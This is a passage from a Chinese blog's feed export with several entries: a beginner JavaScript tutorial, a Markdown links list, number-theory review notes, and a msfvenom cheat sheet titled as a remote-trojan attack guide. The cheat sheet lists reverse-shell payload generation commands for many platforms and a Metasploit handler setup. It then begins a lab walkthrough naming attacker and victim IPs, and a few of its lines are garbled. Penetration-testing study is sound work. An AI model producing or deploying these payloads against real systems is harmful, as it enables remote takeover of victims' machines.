<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（1） window.alert(str) 弹出警告框</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>描述：</strong></font>在当前窗口中弹出一个警告对话框，str为对话框中显示的内容。<br>window：代表当前浏览器窗口，window是一个窗口对象。<br>alert()：弹出一个对话框。<br>str：表示要输出的内容。</p>
</blockquote>
<br />

<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;来试一波&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/12/5c877dd02cfeb.jpg&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">&lt;h1&gt;我的第一个页面&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;我的第一个段落。&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert(<span class="number">5</span> + <span class="number">6</span>);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/12/5c877e7a8a039.png" alt="1.png"></p>
<br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（2） document.write(str) 写到 HTML 文档</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>描述：</strong></font></p>
</blockquote>
<ol>
<li>document意思“文档”，就是整个网页了。</li>
<li>document是一个文档对象，代表整个网页。</li>
<li>write()是document对象的一个输出方法。</li>
<li>“.”小数点：通过小数点(.)来调用对象的方法。</li>
<li>str：表示要输出的内容。</li>
</ol>
<p><strong>注意事项：</strong></p>
<ol>
<li>请使用 document.write() 仅仅向文档输出写内容。</li>
<li>如果在文档已完成加载后执行 document.write，整个 HTML 页面将被覆盖。</li>
</ol>
<br />

<p>下面实例说明document.write()在文档加载完后执行将会覆盖之前的页面：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt; </span><br><span class="line">&lt;title&gt;点击“点我”前的页面&lt;/title&gt; </span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	</span><br><span class="line">&lt;h1&gt;这是“点我”前的页面Web 页面&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;我的第一个段落。&lt;/p&gt;</span><br><span class="line">&lt;button onclick=<span class="string">&quot;myFunction()&quot;</span>&gt;点我&lt;/button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    document.write(Date());</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br />

<p>在没有点击“点我”前的页面：</p>
<p><img data-src="https://i.loli.net/2019/03/12/5c8785a1aca7f.png" alt="3.png"></p>
<p><br />在点击“点我”后的页面：</p>
<p><img data-src="https://i.loli.net/2019/03/12/5c8785a5c3ea4.png" alt="4.png"></p>
<br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（3） innerHTML 操作 HTML 元素</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>描述：</strong></font></p>
</blockquote>
<ol>
<li>innerHTML用于操作 HTML 元素。</li>
<li>如需从 JavaScript 访问某个 HTML 元素，您可以使用 document.getElementById(id) 方法。</li>
<li>请使用 “id” 属性来标识 HTML 元素，并 innerHTML 来获取或插入元素内容：</li>
</ol>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt; </span><br><span class="line">&lt;title&gt;再来试一波&lt;/title&gt; </span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/12/5c8780490c44e.jpg&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">&lt;h1&gt;我的第一个 Web 页面&lt;/h1&gt;</span><br><span class="line">&lt;p id=<span class="string">&quot;demo&quot;</span>&gt;我的第一个段落。&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML=<span class="string">&quot;段落已修改。&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/12/5c87808ae6e21.png" alt="2.png"></p>
<p><strong>说明：</strong>以上 JavaScript 语句（在 <code>&lt;script&gt;</code> 标签中）可以在 web 浏览器中执行：</p>
<ol>
<li><strong><code>document.getElementById(&quot;demo&quot;)</code> ：</strong>是使用 <code>id</code> 属性来查找 HTML 元素的 JavaScript 代码 。</li>
<li><strong><code>innerHTML = &quot;段落已修改。&quot;</code>：</strong> 是用于修改元素的 HTML 内容(innerHTML)的 JavaScript 代码。</li>
</ol>
<br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（4） console.log() 写到控制台。</strong></font></p>
<p>如果您的浏览器支持调试，你可以使用 console.log() 方法在浏览器中显示 JavaScript 值。</p>
<p>浏览器中使用 F12 来启用调试模式， 在调试窗口中点击 “Console” 菜单。</p>
<p><strong>Tip：</strong>程序中调试是测试，查找及减少bug(错误)的过程。</p>
<br />

<p>下面实例代码先写到一个 .html的文档里，然后在浏览器运行这个文档。运行后启用调试模式点击”Console” 菜单即可看到输出结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt; </span><br><span class="line">&lt;title&gt;输出到控制台&lt;/title&gt; </span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/12/5c8787ce408d7.jpg&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">&lt;h1&gt;注意要启动调试模式&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">浏览器中(Chrome, IE, Firefox) 使用 F12 来启用调试模式， 在调试窗口中点击 <span class="string">&quot;Console&quot;</span> 菜单。</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">a = <span class="number">5</span>;</span><br><span class="line">b = <span class="number">6</span>;</span><br><span class="line">c = a + b;</span><br><span class="line">console.log(c);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/12/5c8788a01fd0b.png" alt="5.png"></p>
<br />

<br />

<h3 id="二-JavaScript-语法"><a href="#二-JavaScript-语法" class="headerlink" title="二. JavaScript 语法"></a><font color="#FF6347" face="Comic sans MS">二. JavaScript 语法</font></h3><br />

<h4 id="2-1-基本法则"><a href="#2-1-基本法则" class="headerlink" title="2.1 基本法则"></a><font color="#3CB371" face="Comic sans MS">2.1 基本法则</font></h4><blockquote>
<ol>
<li><strong>声明变量：</strong>使用关键字**<code>var</code>**，如：<code>var name; var num=12;</code></li>
<li><strong>命名规则：</strong>变量名不能以数字开头，可以是字母或下划线开头。变量名可以包含字母、数字、下划线。</li>
<li><strong>大小写敏感：</strong>JS中的变量名是区分大小写的。</li>
<li><strong>驼峰式命名：</strong>第一个单词全小写，后面的每一个单词首字母大写。如：**<code>var  getUserName;</code>**</li>
<li><strong>语句块：</strong>花括号**<code>&#123;...&#125;</code>**，JavaScript的语法和Java语言类似</li>
<li><strong>语句结束符：</strong>英文分号**<code>;</code>**，JavaScript的语法和Java语言类似</li>
<li><strong>缩进：</strong>花括号{…}内的语句具有缩进，通常是4个空格，并不强制使用。缩进有助于我们理解代码的层次。</li>
<li><strong>注释：</strong>单行**<code>//</code><strong>，多行</strong><code>/*...*/</code>**，不是所有的 JavaScript 语句都是”命令”。</li>
<li><strong>空格：</strong>JavaScript 会忽略多余的空格。可以向脚本添加空格，来提高其可读性。</li>
<li><strong>一行：</strong>一行代码可包含多个语句，每个语句用**<code>;</code>**表示语句结束。但 不建议一行写多个语句!（因为要层次感）</li>
<li><strong>多行：</strong>文本字符串中使用反斜杠**<code>\</code>**对代码行进行换行。但是只能字符串使用，变量名函数名等其他不能使用。</li>
</ol>
</blockquote>
<p>如：<br><code>document.write(&quot;你好 \</code><br><code>世界!&quot;);</code></p>
<p><strong>提示：</strong>JavaScript 是脚本语言。浏览器会在读取代码时，逐行地执行脚本代码。而对于传统编程来说，会在执行前对所有代码进行编译。</p>
<br />

<p><font color="#FF7F00"><strong>Tip1：</strong></font>以下是 JavaScript 中最​​重要的保留字（按字母顺序）：</p>
<p><img data-src="https://i.loli.net/2019/03/12/5c87933bee96c.png" alt="6.png"></p>
<br />

<p><font color="#FF7F00"><strong>Tip2：</strong></font>JavaScript 有多种数据类型：数字，字符串，数组，对象等等（在编程语言中，一般固定值称为字面量，如 3.14。）：</p>
<p><font color="#FF7F00"></font></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> length = <span class="number">16</span>;                                  <span class="comment">// Number 通过数字字面量赋值 </span></span><br><span class="line"><span class="keyword">var</span> points = x * <span class="number">10</span>;                              <span class="comment">// Number 通过表达式字面量赋值</span></span><br><span class="line"><span class="keyword">var</span> lastName = <span class="string">&quot;Johnson&quot;</span>;                         <span class="comment">// String 通过字符串字面量赋值</span></span><br><span class="line"><span class="keyword">var</span> cars = [<span class="string">&quot;Saab&quot;</span>, <span class="string">&quot;Volvo&quot;</span>, <span class="string">&quot;BMW&quot;</span>];              <span class="comment">// Array  通过数组字面量赋值</span></span><br><span class="line"><span class="keyword">var</span> person = &#123;<span class="attr">firstName</span>:<span class="string">&quot;John&quot;</span>, <span class="attr">lastName</span>:<span class="string">&quot;Doe&quot;</span>&#125;;  <span class="comment">// Object 通过对象字面量赋值</span></span><br></pre></td></tr></table></figure>

<br />

<p><font color="#FF7F00"><strong>Tip3：</strong></font>JavaScript 语句通常以一个 语句标识符 为开始，并执行该语句。语句标识符是保留关键字不能作为变量名使用。</p>
<p>下表列出了 JavaScript 语句标识符 (关键字) ：</p>
<p><img data-src="https://i.loli.net/2019/03/12/5c87953d930f2.png" alt="7.png"></p>
<p><font color="#FF7F00"></font></p>
<br />

<h4 id="2-2-变量和数据类型"><a href="#2-2-变量和数据类型" class="headerlink" title="2.2 变量和数据类型"></a><font color="#3CB371" face="Comic sans MS">2.2 变量和数据类型</font></h4><br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（1） 变量</strong></font></p>
<p>变量是有数据类型的，这个类型来源于“变量的值”，换句话说：值是什么类型的，变量就是什么类型的。</p>
<p>这种变量本身类型不固定的语言称之为动态语言，与之对应的是静态语言。静态语言在定义变量时必须指定变量类型，如果赋值的时候类型不匹配，就会报错。例如Java是静态语言，赋值语句如下：</p>
<p>int a &#x3D; 123; &#x2F;&#x2F; a是整数类型变量，类型用int申明a &#x3D; “ABC”; &#x2F;&#x2F; 错误：不能把字符串赋给整型变量</p>
<p>和静态语言相比，动态语言更灵活，就是这个原因。</p>
<blockquote>
<p><font color="#FF7F00"><strong>变量命名规则：</strong></font></p>
</blockquote>
<ol>
<li>变量必须以字母开头</li>
<li>变量也能以 $ 和 _ 符号开头（不过我们不推荐这么做）</li>
<li>变量名称对大小写敏感（y 和 Y 是不同的变量）</li>
</ol>
<br />

<p>您可以在一条语句中声明很多变量。该语句以 var 开头，并使用逗号分隔变量即可：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lastname=<span class="string">&quot;Doe&quot;</span>, age=<span class="number">30</span>, job=<span class="string">&quot;carpenter&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>声明也可横跨多行：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lastname=<span class="string">&quot;Doe&quot;</span>,</span><br><span class="line">age=<span class="number">30</span>,</span><br><span class="line">job=<span class="string">&quot;carpenter&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>但是一条语句中声明的多个不可以赋同一个值（x,y 为 undefined， z 为 14。）：）:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x,y,z=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（2） 数据类型</strong></font></p>
<p><font color="#FF7F00"><strong>JS中八种数据类型：</strong></font>Number（数值型）、String（字符串）、bool（布尔型）、undefined、null、array、object、function</p>
<p>这八种数据类型，又分为两大类：</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown</title>
    <url>/post/MarkdownUsage/</url>
    <content><![CDATA[<p><a href="http://marxi.co/">1.Markdown在线编辑器</a></p>
<p><a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown">2.Markdown高级语法大全</a></p>
<p><a href="https://www.zybuluo.com/mdeditor">3.Markdown高级语法</a></p>
<hr>
<hr>
]]></content>
  </entry>
  <entry>
    <title>信息安全数学基础复习笔记</title>
    <url>/post/Mathematical-basis/</url>
    <content><![CDATA[<p>&amp;nbsp;<font face="楷体">12.3复习笔记</font></p>
<h4 id="第一章、整数的可除性"><a href="#第一章、整数的可除性" class="headerlink" title="第一章、整数的可除性"></a><font face="楷体">第一章、整数的可除性</font></h4><h5 id="1-1-整数的概念、欧几里得除法"><a href="#1-1-整数的概念、欧几里得除法" class="headerlink" title="1.1 整数的概念、欧几里得除法"></a><font face="楷体">1.1 整数的概念、欧几里得除法</font></h5><p><a href="https://s1.ax1x.com/2018/12/03/FM6Bwj.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FM6Bwj.jpg" alt="1"></a><br><a href="https://s1.ax1x.com/2018/12/03/FM6hm4.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FM6hm4.jpg" alt="2"></a><br>&amp;nbsp;</p>
<h5 id="1-2-最大公因数与广义欧几里得除法"><a href="#1-2-最大公因数与广义欧几里得除法" class="headerlink" title="1.2 最大公因数与广义欧几里得除法"></a><font face="楷体">1.2 最大公因数与广义欧几里得除法</font></h5><p><a href="https://s1.ax1x.com/2018/12/03/FM6v0H.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FM6v0H.jpg" alt="3"></a><br><a href="https://s1.ax1x.com/2018/12/03/FMcSAA.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FMcSAA.jpg" alt="4"></a><br>&amp;nbsp;</p>
<h5 id="1-3-整除的进一步性质及最小公倍数"><a href="#1-3-整除的进一步性质及最小公倍数" class="headerlink" title="1.3 整除的进一步性质及最小公倍数"></a><font face="楷体">1.3 整除的进一步性质及最小公倍数</font></h5><h5 id="1-4-整数分解"><a href="#1-4-整数分解" class="headerlink" title="1.4 整数分解"></a><font face="楷体">1.4 整数分解</font></h5><p><a href="https://s1.ax1x.com/2018/12/03/FMcFc8.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FMcFc8.jpg" alt="5"></a><br>&amp;nbsp;</p>
<h5 id="1-5-素数的算术基本定理"><a href="#1-5-素数的算术基本定理" class="headerlink" title="1.5 素数的算术基本定理"></a><font face="楷体">1.5 素数的算术基本定理</font></h5><p><a href="https://s1.ax1x.com/2018/12/03/FMc8uF.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FMc8uF.jpg" alt="6"></a></p>
<p>&amp;nbsp;<br>&amp;nbsp;</p>
<h4 id="第二章、同余"><a href="#第二章、同余" class="headerlink" title="第二章、同余"></a><font face="楷体">第二章、同余</font></h4><h5 id="2-1-同余的概念及基本性质"><a href="#2-1-同余的概念及基本性质" class="headerlink" title="2.1 同余的概念及基本性质"></a><font face="楷体">2.1 同余的概念及基本性质</font></h5><p><a href="https://s1.ax1x.com/2018/12/03/FMcIKS.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FMcIKS.jpg" alt="7"></a><br><a href="https://s1.ax1x.com/2018/12/03/FMcTbQ.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FMcTbQ.jpg" alt="8"></a><br>&amp;nbsp;</p>
<h5 id="2-2-剩余类及完全剩余系"><a href="#2-2-剩余类及完全剩余系" class="headerlink" title="2.2 剩余类及完全剩余系"></a><font face="楷体">2.2 剩余类及完全剩余系</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8N4wn.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8N4wn.jpg" alt="9"></a><br>&amp;nbsp;</p>
<h5 id="2-3-简化剩余系与欧拉函数"><a href="#2-3-简化剩余系与欧拉函数" class="headerlink" title="2.3 简化剩余系与欧拉函数"></a><font face="楷体">2.3 简化剩余系与欧拉函数</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8N7WT.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8N7WT.jpg" alt="10"></a><br>&amp;nbsp;</p>
<h5 id="2-4-欧拉定理、费马小定理、Wilson定理"><a href="#2-4-欧拉定理、费马小定理、Wilson定理" class="headerlink" title="2.4 欧拉定理、费马小定理、Wilson定理"></a><font face="楷体">2.4 欧拉定理、费马小定理、Wilson定理</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8Njm9.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8Njm9.jpg" alt="11"></a><br>&amp;nbsp;</p>
<h5 id="2-5-模重复平方算法"><a href="#2-5-模重复平方算法" class="headerlink" title="2.5 模重复平方算法"></a><font face="楷体">2.5 模重复平方算法</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8NxT1.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8NxT1.jpg" alt="12"></a></p>
<p>&amp;nbsp;<br>&amp;nbsp;<br><font face="楷体">12.5复习笔记</font></p>
<h4 id="第三章、同余式"><a href="#第三章、同余式" class="headerlink" title="第三章、同余式"></a><font face="楷体">第三章、同余式</font></h4><h5 id="3-1-基本概念及一次同余式"><a href="#3-1-基本概念及一次同余式" class="headerlink" title="3.1 基本概念及一次同余式"></a><font face="楷体">3.1 基本概念及一次同余式</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UpY6.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UpY6.jpg" alt="13"></a><br>&amp;nbsp;</p>
<h5 id="3-2-中国剩余定理"><a href="#3-2-中国剩余定理" class="headerlink" title="3.2 中国剩余定理"></a><font face="楷体">3.2 中国剩余定理</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UF6e.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UF6e.jpg" alt="14"></a><br>&amp;nbsp;</p>
<h5 id="3-3-高次同余式的解法及解数"><a href="#3-3-高次同余式的解法及解数" class="headerlink" title="3.3 高次同余式的解法及解数"></a><font face="楷体">3.3 高次同余式的解法及解数</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UV0A.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UV0A.jpg" alt="15"></a><br>&amp;nbsp;</p>
<h5 id="3-4-素数模的同余式"><a href="#3-4-素数模的同余式" class="headerlink" title="3.4 素数模的同余式"></a><font face="楷体">3.4 素数模的同余式</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8Utkq.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8Utkq.jpg" alt="16"></a></p>
<p>&amp;nbsp;<br>&amp;nbsp;</p>
<h4 id="第四章、二次同余式与平方剩余"><a href="#第四章、二次同余式与平方剩余" class="headerlink" title="第四章、二次同余式与平方剩余"></a><font face="楷体">第四章、二次同余式与平方剩余</font></h4><h5 id="4-1-一般二次同余式"><a href="#4-1-一般二次同余式" class="headerlink" title="4.1 一般二次同余式"></a><font face="楷体">4.1 一般二次同余式</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UBX4.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UBX4.jpg" alt="17"></a><br>&amp;nbsp;</p>
<h5 id="4-2-模为奇素数的平方剩余与平方剩余"><a href="#4-2-模为奇素数的平方剩余与平方剩余" class="headerlink" title="4.2 模为奇素数的平方剩余与平方剩余"></a><font face="楷体">4.2 模为奇素数的平方剩余与平方剩余</font></h5><h5 id="4-3-勒让得符号"><a href="#4-3-勒让得符号" class="headerlink" title="4.3 勒让得符号"></a><font face="楷体">4.3 勒让得符号</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8Uy7R.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8Uy7R.jpg" alt="18"></a><br>&amp;nbsp;</p>
<h5 id="4-4-二次互反律"><a href="#4-4-二次互反律" class="headerlink" title="4.4 二次互反律"></a><font face="楷体">4.4 二次互反律</font></h5><h5 id="4-5-雅可比符号"><a href="#4-5-雅可比符号" class="headerlink" title="4.5 雅可比符号"></a><font face="楷体">4.5 雅可比符号</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UjgS.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UjgS.jpg" alt="19"></a></p>
<p>&amp;nbsp;<br>&amp;nbsp;</p>
<h4 id="第五章、原根与指标"><a href="#第五章、原根与指标" class="headerlink" title="第五章、原根与指标"></a><font face="楷体">第五章、原根与指标</font></h4><h5 id="5-1-指数及基本性质"><a href="#5-1-指数及基本性质" class="headerlink" title="5.1 指数及基本性质"></a><font face="楷体">5.1 指数及基本性质</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UzuQ.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UzuQ.jpg" alt="20"></a><br><a href="https://s1.ax1x.com/2018/12/09/F8apHs.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8apHs.jpg" alt="21"></a><br>&amp;nbsp;</p>
<h5 id="5-2-原根"><a href="#5-2-原根" class="headerlink" title="5.2 原根"></a><font face="楷体">5.2 原根</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8anb9.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8anb9.jpg" alt="22"></a><br>&amp;nbsp;</p>
<h5 id="5-3-指标及n次同余式"><a href="#5-3-指标及n次同余式" class="headerlink" title="5.3 指标及n次同余式"></a><font face="楷体">5.3 指标及n次同余式</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8a38K.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8a38K.jpg" alt="23"></a><br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>信安数学</tag>
      </tags>
  </entry>
  <entry>
    <title>msfvenom生成各类Payload命令，远程木马攻击</title>
    <url>/post/Metasploit1/</url>
    <content><![CDATA[<h4 id="msfvenom生成各类Payload命令"><a href="#msfvenom生成各类Payload命令" class="headerlink" title="   msfvenom生成各类Payload命令"></a><font face="Arial">   msfvenom生成各类Payload命令</font></h4><blockquote>
<p><font face="Arial">Often one of the most useful(and to the beginner underrated) abilities of Metasploit is the  msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit&#x2F;multi&#x2F;handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address(LAN IP if  attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.</font></p>
</blockquote>
<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><p><font face="Arial">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f elf &gt; shell.elf</font></p>
<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><p><font face="Arial">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f exe &gt; shell.exe</font></p>
<h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><p><font face="Arial">msfvenom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f macho &gt; shell.macho</font></p>
<h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><p><font face="Arial">msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f raw &gt; shell.php</font></p>
<p><font face="Arial">cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</font></p>
<h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><p><font face="Arial">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f asp &gt; shell.asp</font></p>
<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><p><font face="Arial">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f raw &gt; shell.jsp</font></p>
<h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><p><font face="Arial">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f war &gt; shell.war                    Scripting Payloads</font></p>
<h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><p><font face="Arial">msfvenom -p cmd&#x2F;unix&#x2F;reverse_python LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f raw &gt; shell.py</font></p>
<h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><p><font face="Arial">msfvenom -p cmd&#x2F;unix&#x2F;reverse_bash LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f raw &gt; shell.sh</font></p>
<h5 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h5><p><font face="Arial">msfvenom -p cmd&#x2F;unix&#x2F;reverse_perl LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f raw &gt; shell.pl</font></p>
<h5 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h5><p><font face="Arial">For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</font></p>
<h5 id="Linux-Based-Shellcode"><a href="#Linux-Based-Shellcode" class="headerlink" title="Linux Based Shellcode"></a>Linux Based Shellcode</h5><p><font face="Arial">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f <language></font></p>
<h5 id="Windows-Based-Shellcode"><a href="#Windows-Based-Shellcode" class="headerlink" title="Windows Based Shellcode"></a>Windows Based Shellcode</h5><p>Your IP Address&gt; LPORT&#x3D;<Your Port to Connect On> -f  language    “language放在&lt;&gt;里”<br></font></p>
<h5 id="Mac-Based-Shellcode"><a href="#Mac-Based-Shellcode" class="headerlink" title="Mac Based Shellcode"></a>Mac Based Shellcode</h5><p><font face="Arial">msfvenom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f <language></font></p>
<h5 id="Handlers模块"><a href="#Handlers模块" class="headerlink" title="Handlers模块"></a><font face="Arial">Handlers模块</h5><p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</font></p>
<blockquote>
<p><font face="Arial">use exploit&#x2F;multi&#x2F;handler</font><br> <font face="Arial">set LHOST <LHOST value></font><br> <font face="Arial">set LPORT <LPORT value></font><br> <font face="Arial">exploit -j -z</font><br> <font face="Arial">Once the required values are completed the following command will </font>execute your handler – ‘msfconsole -L -r ‘</font></p>
</blockquote>
<hr>
<p>&amp;nbsp;<br>&amp;nbsp;<br><strong>下面以一个实例说明使用方法</strong></p>
<p>Metasploit之我的远程控制软件<br>参考文献：<a href="http://www.evil0x.com/posts/838.html">Metasploit渗透测试笔记(Meterpreter篇</a></p>
<p>远程控制软件–&gt;远控后门木马程序</p>
<p>木马程序–&gt;控制端（攻击者）–&gt;服务端（攻击目标）</p>
<p>测试环境：<br>攻击者：kali-linux    –&gt;192.168.2.146<br>受害者：Windows07     –&gt;192.168.2.107</p>
